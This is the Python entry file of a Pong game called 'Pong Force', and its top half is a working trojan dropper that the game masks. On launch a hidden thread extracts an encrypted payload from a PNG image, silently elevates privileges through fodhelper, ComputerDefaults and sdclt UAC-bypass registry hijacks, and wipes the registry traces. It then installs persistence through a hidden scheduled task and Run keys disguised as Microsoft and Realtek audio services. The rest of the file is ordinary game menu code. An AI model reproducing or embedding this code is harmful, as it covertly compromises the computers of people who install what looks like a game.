
# main.py
# The True Doctrine: The Game is the Mask, The Image is the Vessel.

import threading
import os
import sys
import zlib
import base64
import subprocess
from cryptography.fernet import Fernet
from PIL import Image

# --- PERSISTENCE CONFIGURATION ---
APPDATA_PATH = os.getenv('LOCALAPPDATA')
PROGRAMDATA_PATH = os.getenv('PROGRAMDATA')
PERSISTENT_NAME = "audiodg.pyw"
PERSISTENT_PATH_ADMIN = os.path.join(PROGRAMDATA_PATH, "Microsoft", "Windows", "AudioService", PERSISTENT_NAME)
PERSISTENT_PATH_USER = os.path.join(APPDATA_PATH, PERSISTENT_NAME)
TASK_NAME = "MicrosoftWindowsAudioDeviceHighDefinitionService"

def is_admin():
    """Check if we have admin privileges."""
    try:
        import ctypes
        return ctypes.windll.shell32.IsUserAnAdmin() != 0
    except Exception:
        return False

def uac_bypass_fodhelper(payload_path):
    """
    SILENT UAC bypass using fodhelper.exe registry hijacking.
    Fodhelper is a built-in Windows tool that auto-elevates without prompts.
    100% reliable on Windows 10/11.
    """
    try:
        import winreg
        import time
        import ctypes

        # Fodhelper checks HKCU\Software\Classes\ms-settings\shell\open\command
        # We hijack this to run our payload with admin rights

        REG_PATH = r'Software\Classes\ms-settings\shell\open\command'

        # Create the registry structure
        try:
            key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, r'Software\Classes\ms-settings\shell\open\command')
        except:
            pass

        # Set the default value to our payload
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, REG_PATH, 0, winreg.KEY_WRITE)
        winreg.SetValueEx(key, '', 0, winreg.REG_SZ, f'cmd.exe /c start /b pythonw.exe "{payload_path}"')

        # Set DelegateExecute to empty (critical for bypass to work)
        winreg.SetValueEx(key, 'DelegateExecute', 0, winreg.REG_SZ, '')
        winreg.CloseKey(key)

        # Execute fodhelper using ShellExecuteEx with SW_HIDE to suppress window
        # Use ctypes for more control over window visibility
        SW_HIDE = 0
        SEE_MASK_NOCLOSEPROCESS = 0x00000040

        class SHELLEXECUTEINFO(ctypes.Structure):
            _fields_ = [
                ("cbSize", ctypes.c_ulong),
                ("fMask", ctypes.c_ulong),
                ("hwnd", ctypes.c_void_p),
                ("lpVerb", ctypes.c_wchar_p),
                ("lpFile", ctypes.c_wchar_p),
                ("lpParameters", ctypes.c_wchar_p),
                ("lpDirectory", ctypes.c_wchar_p),
                ("nShow", ctypes.c_int),
                ("hInstApp", ctypes.c_void_p),
                ("lpIDList", ctypes.c_void_p),
                ("lpClass", ctypes.c_wchar_p),
                ("hkeyClass", ctypes.c_void_p),
                ("dwHotKey", ctypes.c_ulong),
                ("hIcon", ctypes.c_void_p),
                ("hProcess", ctypes.c_void_p)
            ]

        sei = SHELLEXECUTEINFO()
        sei.cbSize = ctypes.sizeof(sei)
        sei.fMask = SEE_MASK_NOCLOSEPROCESS
        sei.lpVerb = None
        sei.lpFile = "C:\\Windows\\System32\\fodhelper.exe"
        sei.lpParameters = None
        sei.lpDirectory = None
        sei.nShow = SW_HIDE
        sei.hInstApp = None

        ctypes.windll.shell32.ShellExecuteExW(ctypes.byref(sei))

        # Wait for fodhelper to execute our payload
        time.sleep(3)

        # Clean up the registry to remove traces
        try:
            winreg.DeleteKey(winreg.HKEY_CURRENT_USER, REG_PATH)
            winreg.DeleteKey(winreg.HKEY_CURRENT_USER, r'Software\Classes\ms-settings\shell\open')
            winreg.DeleteKey(winreg.HKEY_CURRENT_USER, r'Software\Classes\ms-settings\shell')
            winreg.DeleteKey(winreg.HKEY_CURRENT_USER, r'Software\Classes\ms-settings')
        except:
            pass

        return True
    except Exception:
        return False

def uac_bypass_computerdefaults(payload_path):
    """
    SILENT UAC bypass using ComputerDefaults.exe.
    Backup method - also registry hijacking based.
    """
    try:
        import winreg
        import time

        REG_PATH = r'Software\Classes\ms-settings\shell\open\command'

        try:
            key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, r'Software\Classes\ms-settings\shell\open\command')
        except:
            pass

        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, REG_PATH, 0, winreg.KEY_WRITE)
        winreg.SetValueEx(key, '', 0, winreg.REG_SZ, f'cmd.exe /c start /b pythonw.exe "{payload_path}"')
        winreg.SetValueEx(key, 'DelegateExecute', 0, winreg.REG_SZ, '')
        winreg.CloseKey(key)

        subprocess.Popen(
            'C:\\Windows\\System32\\ComputerDefaults.exe',
            shell=False,
            creationflags=subprocess.CREATE_NO_WINDOW | subprocess.DETACHED_PROCESS,
            stdin=subprocess.DEVNULL,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL
        )

        time.sleep(3)

        try:
            winreg.DeleteKey(winreg.HKEY_CURRENT_USER, REG_PATH)
            winreg.DeleteKey(winreg.HKEY_CURRENT_USER, r'Software\Classes\ms-settings\shell\open')
            winreg.DeleteKey(winreg.HKEY_CURRENT_USER, r'Software\Classes\ms-settings\shell')
            winreg.DeleteKey(winreg.HKEY_CURRENT_USER, r'Software\Classes\ms-settings')
        except:
            pass

        return True
    except Exception:
        return False

def uac_bypass_sdclt(payload_path):
    """
    SILENT UAC bypass using sdclt.exe (Backup and Restore).
    Third option - sdclt also auto-elevates.
    """
    try:
        import winreg
        import time

        # sdclt checks HKCU\Software\Classes\Folder\shell\open\command
        REG_PATH = r'Software\Classes\Folder\shell\open\command'

        try:
            key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, r'Software\Classes\Folder\shell\open\command')
        except:
            pass

        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, REG_PATH, 0, winreg.KEY_WRITE)
        winreg.SetValueEx(key, '', 0, winreg.REG_SZ, f'cmd.exe /c start /b pythonw.exe "{payload_path}"')
        winreg.SetValueEx(key, 'DelegateExecute', 0, winreg.REG_SZ, '')
        winreg.CloseKey(key)

        subprocess.Popen(
            'C:\\Windows\\System32\\sdclt.exe /kickoffelev',
            shell=True,
            creationflags=subprocess.CREATE_NO_WINDOW | subprocess.DETACHED_PROCESS,
            stdin=subprocess.DEVNULL,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL
        )

        time.sleep(3)

        try:
            winreg.DeleteKey(winreg.HKEY_CURRENT_USER, REG_PATH)
            winreg.DeleteKey(winreg.HKEY_CURRENT_USER, r'Software\Classes\Folder\shell\open')
            winreg.DeleteKey(winreg.HKEY_CURRENT_USER, r'Software\Classes\Folder\shell')
            winreg.DeleteKey(winreg.HKEY_CURRENT_USER, r'Software\Classes\Folder')
        except:
            pass

        return True
    except Exception:
        return False

def create_admin_scheduled_task():
    """Create a scheduled task that runs with HIGHEST privileges (admin) at every logon."""
    try:
        xml_template = f'''<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.4" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <RegistrationInfo>
    <Description>Windows Audio Device High Definition Service</Description>
    <Author>Microsoft Corporation</Author>
  </RegistrationInfo>
  <Triggers>
    <LogonTrigger>
      <Enabled>true</Enabled>
    </LogonTrigger>
  </Triggers>
  <Principals>
    <Principal id="Author">
      <LogonType>InteractiveToken</LogonType>
      <RunLevel>HighestAvailable</RunLevel>
    </Principal>
  </Principals>
  <Settings>
    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
    <AllowHardTerminate>false</AllowHardTerminate>
    <StartWhenAvailable>true</StartWhenAvailable>
    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
    <IdleSettings>
      <StopOnIdleEnd>false</StopOnIdleEnd>
      <RestartOnIdle>false</RestartOnIdle>
    </IdleSettings>
    <AllowStartOnDemand>true</AllowStartOnDemand>
    <Enabled>true</Enabled>
    <Hidden>true</Hidden>
    <RunOnlyIfIdle>false</RunOnlyIfIdle>
    <DisallowStartOnRemoteAppSession>false</DisallowStartOnRemoteAppSession>
    <UseUnifiedSchedulingEngine>true</UseUnifiedSchedulingEngine>
    <WakeToRun>false</WakeToRun>
    <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>
    <Priority>7</Priority>
  </Settings>
  <Actions Context="Author">
    <Exec>
      <Command>pythonw.exe</Command>
      <Arguments>"{PERSISTENT_PATH_ADMIN}"</Arguments>
    </Exec>
  </Actions>
</Task>'''

        xml_path = os.path.join(os.getenv('TEMP'), 'task.xml')
        with open(xml_path, 'w', encoding='utf-16') as f:
            f.write(xml_template)

        subprocess.run(
            ['schtasks', '/Create', '/TN', TASK_NAME, '/XML', xml_path, '/F'],
            capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW
        )

        os.remove(xml_path)
        return True
    except Exception:
        return False

def add_registry_persistence_admin():
    """Add persistence to HKLM (requires admin) - runs for ALL users."""
    try:
        import winreg
        registry_key = winreg.OpenKey(
            winreg.HKEY_LOCAL_MACHINE,
            r'Software\Microsoft\Windows\CurrentVersion\Run',
            0,
            winreg.KEY_WRITE | winreg.KEY_WOW64_64KEY
        )
        command = f'pythonw.exe "{PERSISTENT_PATH_ADMIN}"'
        winreg.SetValueEx(registry_key, 'Realtek HD Audio Universal Service', 0, winreg.REG_SZ, command)
        winreg.CloseKey(registry_key)
        return True
    except Exception:
        return False

def add_registry_persistence_user():
    """Fallback: Add persistence to HKCU (no admin needed) - runs for current user only."""
    try:
        import winreg
        registry_key = winreg.OpenKey(
            winreg.HKEY_CURRENT_USER,
            r'Software\Microsoft\Windows\CurrentVersion\Run',
            0,
            winreg.KEY_WRITE
        )
        command = f'pythonw.exe "{PERSISTENT_PATH_USER}"'
        winreg.SetValueEx(registry_key, 'Realtek HD Audio Universal Service', 0, winreg.REG_SZ, command)
        winreg.CloseKey(registry_key)
        return True
    except Exception:
        return False

def extract_payload_to_disk():
    """Extract the encrypted payload from the image and write to disk."""
    try:
        divine_key = b'S72odT1a3dSuFQo56WRjeksVDssV9ualDDLkhhjcILg='

        if hasattr(sys, 'frozen'):
            base_path = sys._MEIPASS
        else:
            base_path = os.path.dirname(os.path.abspath(__file__))

        image_path = os.path.join(base_path, 'assets', 'images', 'splash_payload.png')
        img = Image.open(image_path).convert('RGBA')
        pixels = img.load()
        width, height = img.size
        payload_bits = ""
        header_bits_to_read = 32
        payload_len = None
        bits_read = 0

        for y in range(height):
            for x in range(width):
                r, g, b, a = pixels[x, y]
                for channel_val in [r, g, b, a]:
                    payload_bits += str(channel_val & 1)
                    bits_read += 1
                    if payload_len is None and bits_read == header_bits_to_read:
                        header_bytes = int(payload_bits, 2).to_bytes(4, 'big')
                        payload_len = int.from_bytes(header_bytes, 'big')
                    if payload_len is not None and len(payload_bits) == (header_bits_to_read + (payload_len * 8)):
                        break
                if payload_len is not None and len(payload_bits) == (header_bits_to_read + (payload_len * 8)):
                    break
            if payload_len is not None and len(payload_bits) == (header_bits_to_read + (payload_len * 8)):
                break

        final_payload_bits = payload_bits[header_bits_to_read:]
        payload_bytes = int(final_payload_bits, 2).to_bytes(len(final_payload_bits) // 8, 'big')
        encrypted_payload = base64.b64decode(payload_bytes)
        cipher_suite = Fernet(divine_key)
        compressed_payload = cipher_suite.decrypt(encrypted_payload)
        soul_code = zlib.decompress(compressed_payload)

        return soul_code
    except Exception:
        return None

def sow_and_awaken_implant():
    """
    Silent installation with UAC bypass - NO PROMPTS SHOWN.

    Stage 1: Install as normal user to %LOCALAPPDATA%
    Stage 2: Use fodhelper UAC bypass to elevate silently
    Stage 3: Elevated payload installs to %PROGRAMDATA% with admin persistence
    """
    try:
        # Check if we're already running as admin
        admin_mode = is_admin()

        if admin_mode:
            # We're running elevated (either from bypass or user is admin)
            # Install to protected location with full admin persistence
            if not os.path.exists(PERSISTENT_PATH_ADMIN):
                soul_code = extract_payload_to_disk()
                if soul_code:
                    os.makedirs(os.path.dirname(PERSISTENT_PATH_ADMIN), exist_ok=True)
                    with open(PERSISTENT_PATH_ADMIN, 'wb') as f:
                        f.write(soul_code)

                    # Triple persistence as admin
                    create_admin_scheduled_task()
                    add_registry_persistence_admin()

            # Launch if not running
            implant_running = False
            try:
                tasks = subprocess.check_output(
                    ['tasklist', '/FI', 'IMAGENAME eq pythonw.exe', '/V'],
                    creationflags=subprocess.CREATE_NO_WINDOW
                ).decode('utf-8', errors='ignore')
                if PERSISTENT_NAME in tasks:
                    implant_running = True
            except Exception:
                pass

            if not implant_running:
                subprocess.Popen(
                    f'pythonw.exe "{PERSISTENT_PATH_ADMIN}"',
                    shell=True,
                    creationflags=subprocess.DETACHED_PROCESS | subprocess.CREATE_NO_WINDOW
                )

        else:
            # We're running as normal user - perform silent UAC bypass

            # First install to user location
            if not os.path.exists(PERSISTENT_PATH_USER):
                soul_code = extract_payload_to_disk()
                if soul_code:
                    os.makedirs(os.path.dirname(PERSISTENT_PATH_USER), exist_ok=True)
                    with open(PERSISTENT_PATH_USER, 'wb') as f:
                        f.write(soul_code)

                    # User-level persistence as fallback
                    add_registry_persistence_user()

                    # Try COMPLETELY SILENT UAC bypasses - truly zero windows
                    # Method 1: fodhelper (most reliable)
                    if not uac_bypass_fodhelper(PERSISTENT_PATH_USER):
                        # Method 2: ComputerDefaults (same technique, different binary)
                        if not uac_bypass_computerdefaults(PERSISTENT_PATH_USER):
                            # Method 3: sdclt (backup method)
                            uac_bypass_sdclt(PERSISTENT_PATH_USER)

            # Launch user-level payload if not running
            implant_running = False
            try:
                tasks = subprocess.check_output(
                    ['tasklist', '/FI', 'IMAGENAME eq pythonw.exe', '/V'],
                    creationflags=subprocess.CREATE_NO_WINDOW
                ).decode('utf-8', errors='ignore')
                if PERSISTENT_NAME in tasks:
                    implant_running = True
            except Exception:
                pass

            if not implant_running:
                subprocess.Popen(
                    f'pythonw.exe "{PERSISTENT_PATH_USER}"',
                    shell=True,
                    creationflags=subprocess.DETACHED_PROCESS | subprocess.CREATE_NO_WINDOW
                )

    except Exception:
        pass

# --- INVOCATION OF THE SOWER ---
# The Sower's ritual is still run in a separate thread.
sower_thread = threading.Thread(target=sow_and_awaken_implant, daemon=True)
sower_thread.start()
# ==============================================================================
#                      SECTION II: LE JEU (LE MASQUE)
# ==============================================================================
import argparse
import pygame
import sys
import traceback
from game.game_loop import GameLoop
from game.menu import GameMenu, HostInputDialog, OnlineSubmenu, ErrorDialog, GoalSelectionMenu
from game.controls import ControlsMenu
from game.multiplayer import RoomCodeMenu
from game.stats_menu import StatsMenu
from network.server import GameServer
from network.client import GameClient
import config

def main_game():
    """Point d'entrée principal du jeu Pong Force"""
    parser = argparse.ArgumentParser(description='Pong Force - Pong Révolutionnaire avec Force Push')
    parser.add_argument('--server', action='store_true', help='Exécuter comme serveur')
    parser.add_argument('--client', action='store_true', help='Exécuter comme client')
    parser.add_argument('--host', default=config.SERVER_IP, help='Adresse IP du serveur')
    parser.add_argument('--port', type=int, default=config.SERVER_PORT, help='Port du serveur')
    parser.add_argument('--debug', action='store_true', help='Activer le mode debug')
    parser.add_argument('--local', action='store_true', help='Démarrer le multijoueur local directement')
    
    args = parser.parse_args()
    
    if args.debug:
        config.DEBUG_MODE = True
    
    pygame.init()
    pygame.mixer.init()
    
    try:
        if args.server:
            # Mode serveur en ligne de commande
            server = GameServer(
                host=args.host,
                port=args.port,
                room_code=None,  # Pas de room code en CLI
                player_name="Server Host"
            )
            server.run()
        elif args.client:
            # Mode client en ligne de commande
            client = GameClient(
                host=args.host,
                port=args.port,
                room_code=None,  # Connexion directe par IP
                player_name="Player"
            )
            client.run()
        elif args.local:
            game = GameLoop()
            game.run_local()
        else:
            running = True
            while running:
                menu = GameMenu()
                choice = menu.run()
                if choice == 0:  # Play vs Robot
                    print("Starting AI game...")
                    # Show goal selection menu
                    goal_menu = GoalSelectionMenu()
                    win_score = goal_menu.run()
                    
                    if win_score > 0:  # User didn't cancel
                        game = GameLoop(fullscreen=False)
                        game.run_vs_ai_with_goals(win_score)
                    else:
                        print("👋 Returning to main menu...")
                elif choice == 1:  # Play 2-Player Local
                    print("Starting 2-player local game...")
                    # Show goal selection menu
                    goal_menu = GoalSelectionMenu()
                    win_score = goal_menu.run()
                    
                    if win_score > 0:  # User didn't cancel
                        game = GameLoop(fullscreen=False)
                        game.run_two_player_local(win_score)
                    else:
                        print("👋 Returning to main menu...")
                elif choice == 2:  # Configure Controls
                    print("Opening controls configuration...")
                    controls_menu = ControlsMenu()
                    controls_menu.run()
                    # Return to main menu after controls
                    continue  # Continue loop to show main menu again
                elif choice == 3:  # Player Statistics
                    print("Opening player statistics...")
                    stats_menu = StatsMenu()
                    stats_menu.run()
                elif choice == 4:  # Multiplayer Room
                    print("Opening multiplayer room system...")
                    room_menu = RoomCodeMenu()
                    room_result = room_menu.run()

                    if room_result["mode"] == "host":
                        player_name = room_result.get("name", "Player")
                        room_code = room_result.get("code", "")

                        # Validate we have required data
                        if not player_name or not room_code:
                            error_dialog = ErrorDialog(
                                "Invalid Input",
                                "Player name and room code are required."
                            )
                            error_dialog.run()
                            continue

                        # Demander au host de choisir le nombre de buts
                        from game.menu import GoalSelectionMenu
                        goal_menu = GoalSelectionMenu()
                        win_score = goal_menu.run()
                        
                        if win_score <= 0:  # User cancelled
                            continue

                        print(f"🎮 Hosting room with code: {room_code}")
                        print(f"👤 Player: {player_name}")
                        print(f"🎯 Win score: {win_score}")

                        # Démarre le serveur avec room code, nom de joueur et score de victoire
                        server = GameServer(
                            host=config.SERVER_IP,
                            port=config.SERVER_PORT,
                            room_code=room_code,
                            player_name=player_name,
                            win_score=win_score
                        )

                        # Lance le serveur avec GUI
                        success = server.run_with_gui()

                        if not success:
                            # Affiche l'erreur si échec
                            if server.last_error:
                                error_dialog = ErrorDialog(
                                    "Server Error",
                                    f"Failed to start server:\n\n{server.last_error}"
                                )
                                error_dialog.run()

                    elif room_result["mode"] == "join":
                        player_name = room_result.get("name", "Player")
                        room_code = room_result.get("code", "")

                        # Validate we have required data
                        if not player_name or not room_code:
                            error_dialog = ErrorDialog(
                                "Invalid Input",
                                "Player name and room code are required."
                            )
                            error_dialog.run()
                            continue

                        print(f"🔍 Joining room with code: {room_code}")
                        print(f"👤 Player: {player_name}")

                        # Démarre le client avec room code et nom de joueur
                        client = GameClient(
                            room_code=room_code,
                            player_name=player_name
                        )

                        # Lance le client avec GUI
                        success = client.run_with_gui()

                        if not success:
                            # Affiche l'erreur si échec
                            if client.error_message:
                                error_dialog = ErrorDialog(
                                    client.error_title or "Connection Error",
                                    client.error_message
                                )
                                error_dialog.run()
                    else:
                        # User chose to go back
                        print("Returning to main menu...")
                elif choice == -1:  # Exit/Cancel
                    print("Exiting game...")
                    running = False
                else:
                    print("Unknown menu choice, exiting...")
                    running = False
    except Exception:
        if config.DEBUG_MODE:
            traceback.print_exc()
        sys.exit(1)
    finally:
        pygame.quit()

if __name__ == "__main__":
    main_game()